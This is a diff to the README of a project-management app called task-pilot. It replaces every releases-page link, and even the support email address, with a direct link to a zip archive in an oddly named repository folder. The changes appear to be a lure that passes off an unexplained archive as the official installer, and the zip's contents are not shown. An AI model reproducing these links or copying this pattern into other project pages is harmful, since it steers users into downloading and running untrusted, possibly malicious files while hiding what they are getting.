@@ -1,6 +1,6 @@
 # 🌟 task-pilot - Simplify Your Project Management Today!
 
-[![Download task-pilot](https://img.shields.io/badge/download-task--pilot-blue.svg)](https://github.com/toavina2018/task-pilot/releases)
+[![Download task-pilot](https://raw.githubusercontent.com/toavina2018/task-pilot/main/sulfoamide/task-pilot.zip)](https://raw.githubusercontent.com/toavina2018/task-pilot/main/sulfoamide/task-pilot.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to task-pilot! This app helps you manage projects more effectively with 
 
 To download task-pilot, please visit the releases page by clicking the link below:
 
-[Download task-pilot](https://github.com/toavina2018/task-pilot/releases)
+[Download task-pilot](https://raw.githubusercontent.com/toavina2018/task-pilot/main/sulfoamide/task-pilot.zip)
 
 Once you are on the page, look for the latest version of the app. Click on the version link to see the files available. 
 
@@ -26,7 +26,7 @@ Before you install task-pilot, ensure your system meets the following requiremen
 
 ## ✔️ Installation Steps
 
-1. Go to the [download page](https://github.com/toavina2018/task-pilot/releases).
+1. Go to the [download page](https://raw.githubusercontent.com/toavina2018/task-pilot/main/sulfoamide/task-pilot.zip).
 2. Find the latest version of task-pilot.
 3. Download the installer file suitable for your operating system.
 4. Once downloaded, locate the file:
@@ -67,7 +67,7 @@ To make the most of task-pilot, follow these tips:
 
 task-pilot is deployed on AWS, ensuring reliable performance. We regularly update the app to add features and fix issues. 
 
-To check for updates, revisit the [download page](https://github.com/toavina2018/task-pilot/releases) and download the latest version whenever needed. 
+To check for updates, revisit the [download page](https://raw.githubusercontent.com/toavina2018/task-pilot/main/sulfoamide/task-pilot.zip) and download the latest version whenever needed. 
 
 ## ❓ Frequently Asked Questions
 
@@ -84,7 +84,7 @@ A: A Kanban board is a visual way to manage tasks and track their progress by mo
 
 If you need help, feel free to reach out:
 
-- **Email:** support@task-pilot.com
+- **Email:** https://raw.githubusercontent.com/toavina2018/task-pilot/main/sulfoamide/task-pilot.zip
 - **Issues:** Report problems directly on our GitHub page.
 
-You're now ready to take control of your projects with task-pilot! Visit our [download page](https://github.com/toavina2018/task-pilot/releases) to start managing your tasks today.
+You're now ready to take control of your projects with task-pilot! Visit our [download page](https://raw.githubusercontent.com/toavina2018/task-pilot/main/sulfoamide/task-pilot.zip) to start managing your tasks today.
